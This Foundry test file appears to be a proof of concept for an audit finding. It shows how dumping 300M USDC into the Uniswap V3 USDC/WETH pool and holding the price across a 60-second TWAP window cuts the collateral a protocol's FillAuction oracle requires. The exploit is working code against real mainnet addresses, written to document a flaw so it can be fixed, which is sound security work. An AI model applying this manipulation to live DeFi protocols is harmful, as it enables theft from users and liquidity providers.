// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../src/FillAuction.sol";
import "../src/oracles/UniswapV3NotionalOracle.sol";

/// Minimal slice of the Uniswap V3 SwapRouter (the original, with a `deadline`
/// field) — enough to push the (USDC, WETH) pool's price for the PoC.
interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24  fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata params)
        external payable returns (uint256 amountOut);
}

/// N-3 (audit.md) PoC — oracle manipulation against the ETH-denominated
/// collateral oracle.
///
/// `UniswapV3NotionalOracle.quoteEthNotional` sizes a filler's required stake from
/// a 60-second Uniswap V3 TWAP over the order's `(inputToken, WETH, feeTier)` pool. The whole
/// point of the D-1 fix was that the stake should track the *real ETH value* of
/// the order, so slashing has teeth. This test shows that an attacker who moves
/// the pool price and holds it across the (short) 60s window drives the TWAP — and
/// therefore the required collateral — down by a large factor, re-opening the
/// "stake ≈ 0, slashing toothless" failure mode D-1 was meant to close.
///
/// This is the same class as Mango / Cream / Harvest (manipulate an on-chain DEX
/// price that a protocol trusts). The real-world deterrent is capital cost: a
/// deep pool + a long window make it expensive. Here the window is only 60s, so
/// the manipulation just has to be *held*, not averaged away — which is exactly
/// what N-3 warns about. We mint the attacker's USDC with `deal` to demonstrate
/// the mechanism; on mainnet the cost scales with the pool's depth.
contract TwapManipulationTest is Test {
    address constant WETH        = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDC        = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant FACTORY     = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address constant SWAP_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    uint24  constant FEE         = 500; // 0.05% pool — the tier the order prices through

    address treasury = makeAddr("treasury");
    address attacker = makeAddr("attacker");
    FillAuction auction;

    function setUp() public {
        vm.createSelectFork(vm.envString("ALCHEMY_RPC_URL"));
        UniswapV3NotionalOracle oracle = new UniswapV3NotionalOracle(WETH, FACTORY, 60); // 60s TWAP, as deployed
        auction = new FillAuction(treasury, oracle, false);
    }

    function test_manipulatedTwap_collapsesRequiredCollateral() public {
        uint256 deadline  = block.number + 100;
        uint256 fillUsdc  = 3000e6; // ~1 ETH of value at the honest price

        // Honest, un-manipulated required stake.
        uint256 cBefore = auction.previewCollateral(USDC, FEE, fillUsdc, deadline);
        assertGt(cBefore, 0, "baseline collateral must be non-zero");

        // ── Manipulate: dump a large amount of USDC into the SAME pool the
        //    oracle reads, crashing USDC's price in WETH terms. ──────────────
        uint256 dump = 300_000_000e6; // 300M USDC
        deal(USDC, attacker, dump);
        vm.startPrank(attacker);
        IERC20(USDC).approve(SWAP_ROUTER, dump);
        ISwapRouter(SWAP_ROUTER).exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: USDC,
                tokenOut: WETH,
                fee: FEE,
                recipient: attacker,
                deadline: block.timestamp,
                amountIn: dump,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
        vm.stopPrank();

        // Hold the manipulated price across the full 60s TWAP window. With no
        // other trades, the pool's tick stays at the manipulated value, so the
        // mean tick over [now-60, now] equals the manipulated tick.
        vm.warp(block.timestamp + 120);

        // Same query, now priced off the manipulated TWAP.
        uint256 cAfter = auction.previewCollateral(USDC, FEE, fillUsdc, deadline);

        emit log_named_uint("collateral before (wei)", cBefore);
        emit log_named_uint("collateral after  (wei)", cAfter);
        emit log_named_uint("drop %", 100 - (cAfter * 100) / cBefore);

        // The required stake collapsed: the attacker would register against a
        // 3000-USDC order while posting a fraction of the honest collateral,
        // nullifying the slashing deterrent.
        assertLt(cAfter, cBefore, "manipulation must lower the required stake");
        assertLt(cAfter * 2, cBefore, "stake should fall by >50% under this dump");
    }
}
